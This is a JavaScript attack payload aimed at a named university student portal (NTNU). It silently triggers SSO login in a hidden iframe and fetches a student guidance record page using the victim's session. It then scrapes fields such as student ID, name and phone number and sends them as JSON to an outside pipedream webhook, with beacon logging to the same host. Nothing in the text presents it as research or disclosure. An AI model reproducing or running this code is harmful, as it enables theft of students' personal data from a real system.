(async () => {
    const webhook = "https://eokic4rib1w9z4o.m.pipedream.net";
    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
    const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI";
    
    // 簡單日誌，用 Image Beacon 避免 CORS
    const log = (msg) => { new Image().src = `${webhook}?log=${encodeURIComponent(msg)}`; };

    // 1. Zero-Click 認證 (隱藏 iframe)
    const authFrame = document.createElement('iframe');
    authFrame.style.display = 'none';
    authFrame.src = ssoUrl;
    document.body.appendChild(authFrame);

    // 等待 8 秒讓 SSO 跑完
    await new Promise(r => setTimeout(r, 15000));

    try {
        // 2. 獲取原始 HTML
        const response = await fetch(targetUrl, {credentials: 'include'});
        const html = await response.text();

        // 3. 解析 HTML (關鍵步驟：在瀏覽器端處理，不要傳 HTML 回家)
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, "text/html");
        
        let extractedData = {};
        extractedData["rep_status"] = response.status;


        // 輔助函數：清理字串 (去除 &nbsp; 空格、星號等)
        const clean = (str) => {
            if (!str) return "";
            return str.replace(/&nbsp;/g, '')
                      .replace(/^\s+|\s+$/g, '') // trim
                      .replace(/[*:]/g, '');      // 去除標籤中的 * 和 :
        };

        // 抓取所有 .form-group (這是每一行資料的容器)
        const groups = doc.querySelectorAll('.form-group');
        
        groups.forEach(group => {
            // 找標籤 (Label)
            const labelNode = group.querySelector('label');
            if (!labelNode) return;
            
            const key = clean(labelNode.textContent);
            if (!key) return; // 如果沒標籤就跳過

            let value = "N/A";

            // 情況 A: 唯讀文字 (p.form-control-static)
            const staticText = group.querySelector('.form-control-static');
            if (staticText) {
                value = clean(staticText.textContent);
            } 
            // 情況 B: 輸入框 (input.form-control)
            else {
                const input = group.querySelector('input.form-control');
                if (input) {
                    value = input.value || "EMPTY"; // 輸入框可能為空
                }
            }

            // 存入物件
            extractedData[key] = value;
        });

        // 4. 只傳送乾淨的 JSON 資料
        const payload = JSON.stringify({
            status: "SUCCESS",
            // 這裡只會有學號、姓名、電話等純文字，非常輕量
            data: extractedData,
        });

        // 使用 sendBeacon 發送 (最穩定，且通常不會有 CORS 預檢問題)
        if (navigator.sendBeacon) {
            navigator.sendBeacon(webhook, payload);
        } else {
            // 回退方案
            fetch(webhook, {
                method: 'POST',
                mode: 'no-cors',
                body: payload
            });
        }
        log("Data_Sent");

    } catch (e) {
        log("Error: " + e.message);
    }

    // 清理 iframe
    authFrame.remove();
})();